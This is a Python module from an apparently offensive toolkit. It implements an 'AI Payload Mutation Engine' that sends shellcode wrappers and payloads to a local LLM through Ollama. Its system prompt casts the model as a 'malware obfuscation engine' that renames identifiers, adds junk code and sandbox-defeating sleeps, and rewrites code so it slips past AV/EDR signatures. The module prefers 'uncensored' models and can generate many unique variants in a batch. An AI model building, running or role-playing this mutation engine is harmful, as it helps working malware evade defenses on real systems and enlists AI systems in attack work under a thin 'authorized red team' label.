"""
AI Payload Mutation Engine (T4-3).
Uses Ollama to mutate shellcode wrappers/payloads at the semantic level —
rename variables, restructure logic, add junk code — to evade AV signatures
without breaking functionality. Works on Python, C, Go, PowerShell.
"""
import re, time
from shadowcypher.core.logger import logger


MUTATION_SYSTEM = """You are an expert malware obfuscation engine for authorized red team operations.
Your job is to mutate the given code to evade AV/EDR signature detection while preserving 100% functionality.

Apply ALL of the following mutations:
1. Rename every variable, function, and class to random unrelated names
2. Add meaningless junk code (dead branches, unused variables, no-op loops)
3. Split string literals (e.g., "hello" → "hel"+"lo" or byte arrays)
4. Reorder independent statements where safe
5. Add fake conditional branches that never execute but look real
6. Use equivalent alternative APIs/syscalls where possible
7. Add random sleep/delay calls to defeat sandbox timing analysis
8. Change integer literals to equivalent expressions (e.g., 443 → (400+43))

CRITICAL RULES:
- Output ONLY the mutated code — no explanation, no markdown fences
- The mutated code MUST be functionally identical to the input
- Do NOT break imports, function signatures, or return values
- Preserve shebang lines and encoding declarations"""


class PayloadMutator:
    """
    AI-powered payload mutation. Each call produces a unique variant
    with a different signature fingerprint while keeping identical behavior.
    """

    def __init__(self):
        self._ollama_base = "http://127.0.0.1:11434"

    def mutate(self, code: str, language: str = "python",
               passes: int = 1, on_output=None) -> str:
        """
        Mutate a payload to evade signature detection.

        Args:
            code:     Source code to mutate.
            language: "python" | "c" | "go" | "powershell" | "bash"
            passes:   Number of mutation passes (each pass changes it more).
            on_output: Streaming callback.

        Returns:
            Mutated code string, or original if AI unavailable.
        """
        self._emit(on_output, f"[MUTATOR] Starting {passes}-pass mutation ({language})...\n")
        current = code
        for i in range(passes):
            self._emit(on_output, f"[MUTATOR] Pass {i+1}/{passes}...\n")
            result = self._call_ollama(current, language)
            if result and result.strip() and result != current:
                current = result
                self._emit(on_output, f"[MUTATOR] Pass {i+1} complete — "
                                      f"{len(result)} chars\n")
            else:
                self._emit(on_output, f"[MUTATOR] Pass {i+1} — AI unavailable, skipping\n")
                break

        orig_sig = self._signature(code)
        new_sig = self._signature(current)
        self._emit(on_output, f"[MUTATOR] Original signature: {orig_sig}\n")
        self._emit(on_output, f"[MUTATOR] Mutated signature:  {new_sig}\n")
        changed = orig_sig != new_sig
        self._emit(on_output, f"[MUTATOR] {'✓ SIGNATURE CHANGED' if changed else '⚠ SIGNATURE UNCHANGED'}\n")
        return current

    def mutate_file(self, path: str, output_path: str = None,
                    language: str = None, passes: int = 1,
                    on_output=None) -> str:
        """Mutate a file on disk and write the result."""
        import os
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            code = f.read()
        if not language:
            ext = os.path.splitext(path)[1].lower()
            language = {".py": "python", ".c": "c", ".go": "go",
                        ".ps1": "powershell", ".sh": "bash"}.get(ext, "python")
        mutated = self.mutate(code, language=language, passes=passes, on_output=on_output)
        out_path = output_path or path.replace(".", "_mutated.", 1)
        with open(out_path, "w", encoding="utf-8") as f:
            f.write(mutated)
        self._emit(on_output, f"[MUTATOR] Written: {out_path}\n")
        return out_path

    def batch_mutate(self, code: str, count: int = 5,
                     language: str = "python", on_output=None) -> list[str]:
        """Generate N unique variants of the same payload."""
        self._emit(on_output, f"[MUTATOR] Generating {count} unique variants...\n")
        variants = []
        seen_sigs = set()
        for i in range(count):
            self._emit(on_output, f"[MUTATOR] Variant {i+1}/{count}...\n")
            v = self.mutate(code, language=language, on_output=None)
            sig = self._signature(v)
            if sig not in seen_sigs:
                seen_sigs.add(sig)
                variants.append(v)
                self._emit(on_output, f"[MUTATOR] Variant {i+1}: unique signature {sig}\n")
            else:
                self._emit(on_output, f"[MUTATOR] Variant {i+1}: duplicate, retrying...\n")
        self._emit(on_output, f"[MUTATOR] Generated {len(variants)} unique variants\n")
        return variants

    # ── Internals ────────────────────────────────────────────────────────────

    def _call_ollama(self, code: str, language: str) -> str:
        import urllib.request, json
        prompt = (f"Language: {language}\n\n"
                  f"Mutate this code to evade AV signature detection:\n\n{code}")
        try:
            req = urllib.request.Request(
                f"{self._ollama_base}/api/chat",
                data=json.dumps({
                    "model": self._select_model(),
                    "messages": [
                        {"role": "system", "content": MUTATION_SYSTEM},
                        {"role": "user", "content": f"/no_think\n{prompt}"},
                    ],
                    "stream": False,
                    "think": False,
                    "options": {"num_predict": 4096, "temperature": 0.8},
                }).encode(),
                headers={"Content-Type": "application/json"},
            )
            with urllib.request.urlopen(req, timeout=120) as resp:
                data = json.loads(resp.read())
            raw = data.get("message", {}).get("content", "")
            # Strip any markdown fences the model might add
            raw = re.sub(r"```\w*\n?", "", raw).strip()
            return raw
        except Exception as e:
            logger.warning("mutator", f"Ollama call failed: {e}")
            return ""

    def _select_model(self) -> str:
        import urllib.request, json
        try:
            with urllib.request.urlopen(
                f"{self._ollama_base}/api/tags", timeout=3
            ) as r:
                models = [m["name"] for m in json.loads(r.read()).get("models", [])]
            prefs = ["shadow-uncensored", "shadow-sec", "dolphin", "qwen2.5-coder",
                     "shadowcypher-ai", "qwen3", "mistral", "llama3"]
            for pref in prefs:
                for m in models:
                    if pref in m.lower():
                        return m
            return models[0] if models else "shadowcypher-ai"
        except Exception:
            return "shadowcypher-ai"

    @staticmethod
    def _signature(code: str) -> str:
        """Rough signature — unique token set hash."""
        import hashlib
        tokens = sorted(set(re.findall(r"\b\w+\b", code)))
        return hashlib.md5(" ".join(tokens).encode()).hexdigest()[:12]

    @staticmethod
    def _emit(cb, msg):
        if cb:
            try: cb(msg)
            except Exception: pass


payload_mutator = PayloadMutator()
